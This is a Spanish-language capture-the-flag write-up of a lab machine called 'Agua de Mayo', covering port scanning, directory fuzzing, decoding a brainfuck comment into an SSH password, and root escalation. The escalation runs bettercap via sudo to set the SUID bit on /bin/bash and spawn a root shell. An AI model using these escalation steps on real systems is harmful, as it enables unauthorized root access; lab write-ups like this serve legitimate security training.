# Agua de Mayo
![image](https://github.com/user-attachments/assets/d4ee9a17-fcbe-41a2-ae97-464c3736755e)


## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
sudo nmap -sSCV -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sSCV`: Realiza un escaneo SYN, de versiones y vulnerabilidades.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
![image](https://github.com/user-attachments/assets/ed50cfd3-edc0-44cd-82a7-3674d6df2be8)

En la página principal vemos la página por defecto de Apache, por lo que vamos a hacer fuzzing con **gobuster**. Anque si miramos el código fuente de la página y bajamos hata el final nos encontramos con un comentario.

```
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
```
Es un mensaje codificado en **brainfuck** y si vamos a [dcode](https://www.dcode.fr/brainfuck-language) podremos descifraslo fácilmente.
![image](https://github.com/user-attachments/assets/1c963813-2e64-4947-a5dd-0f45f7dd3808)

Una vez tenemos una posible contraseña, miramos el resultado del fuzzin a ver si encontramos algo.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
![image](https://github.com/user-attachments/assets/1a88b909-9812-4fad-934e-9e35d10cdd50)

Encontramos el directorio **/images** y dentro de él una imagen llamada **agua_ssh.jpg**.

![image](https://github.com/user-attachments/assets/3ffae8f6-13dc-46e5-803c-42efaec93eb3)

Después de buscar si encontramos algo dentro de la imágen, vemos que no hay nada pero que el nombre podría indicarnos un que el usuario de **ssh** sea **agua**. Lo comprobamos con la contraseña y estamos dentro de la máquina.

## Explotación.

```bash
ssh agua@172.17.0.2
```
![image](https://github.com/user-attachments/assets/6044a823-212c-427f-a4af-06b2cc4b3c32)

## Escalada de privilegios.

Comprobamos si hay algún archivo que podamos utilizar con permisos de root.
```bash
sudo -l
```
Vemos que podemos ejecutar **/usr/bin/bettercap** como **root**. Lo ejecutamos y encontramos en la ayuda que podemos ejecutar un comando.

![image](https://github.com/user-attachments/assets/dd3cf928-7197-4a20-85d2-9452b10ad972)

Aprovechamos para cambiar los permisos a la **bash** y así ejecutarla como privilegios.

```bash
! chmod u+s /bin/bash
```
Salimos, y ejecutamos el siguiente comando para optener la bash como **root**.

```bash
/bin/bash -p
```
![image](https://github.com/user-attachments/assets/e42da890-b5cf-497b-aa4c-70011c2c296e)





